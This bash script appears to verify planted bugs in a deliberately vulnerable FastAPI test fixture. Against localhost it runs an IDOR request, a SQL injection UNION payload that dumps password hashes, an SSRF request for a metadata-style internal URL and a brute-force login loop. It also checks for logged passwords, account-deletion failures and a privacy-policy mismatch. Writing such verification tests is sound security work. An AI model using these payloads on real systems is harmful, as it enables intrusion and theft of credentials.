#!/usr/bin/env bash
# Hand-verification script for the FastAPI fixtures (vuln + clean twin).
# Usage: repro-py.sh <port> <internal_port> <analytics_port> <logfile>
# Prints what was actually observed for every planted bug. Start the fixture first.
set -uo pipefail
P=${1:?port}; IP=${2:?internal port}; AP=${3:?analytics port}; LOG=${4:?log file}
B=http://127.0.0.1:$P
tok() { curl -s -X POST "$B/login" -d "username=$1" -d "password=$2" | jq -r '.token // empty'; }

echo "== IDOR: alice reads bob's message 2"
A=$(tok alice alice-fixture-pw)
curl -s -w '  http=%{http_code}\n' "$B/api/messages/2" -H "authorization: Bearer $A"
echo "== SQLi: UNION dumps password hashes"
curl -s -w '\n  http=%{http_code}\n' -G "$B/api/search" --data-urlencode "q=zzz' UNION SELECT id,username,password_hash FROM users--"
echo "== SSRF: preview of internal-only service on $IP"
curl -s -w '\n  http=%{http_code}\n' -G "$B/api/fetch-preview" --data-urlencode "url=http://127.0.0.1:$IP/latest/meta-data/" -H "authorization: Bearer $A"
echo "== Rate limit: 12 bad logins in a row (status codes)"
for i in $(seq 12); do curl -s -o /dev/null -w '%{http_code} ' -X POST "$B/login" -d username=alice -d "password=wrong-guess-$i"; done; echo
echo "== Password in logs"
grep -c 'wrong-guess-1' "$LOG" | sed 's/^/  log lines containing a submitted password: /'
echo "== Missing deletion: register carol, delete account, then try to log in / read data"
curl -s -o /dev/null -X POST "$B/api/register" -H 'content-type: application/json' -d '{"username":"carol","password":"carol-fixture-pw","email":"carol@fixture.test"}'
C=$(tok carol carol-fixture-pw)
curl -s -w '  delete http=%{http_code}\n' -X DELETE "$B/api/account" -H "authorization: Bearer $C"
echo -n "  login as carol after delete -> http="; curl -s -o /dev/null -w '%{http_code}\n' -X POST "$B/login" -d username=carol -d password=carol-fixture-pw
echo "== Policy mismatch: policy text vs. data actually sent to analytics host :$AP"
curl -s "$B/privacy" | grep -io 'we never share data with third parties'
echo -n "  events received by analytics host: "; sleep 0.5; curl -s "http://127.0.0.1:$AP/_events" | jq -c . 2>/dev/null || echo "(analytics host unreachable)"
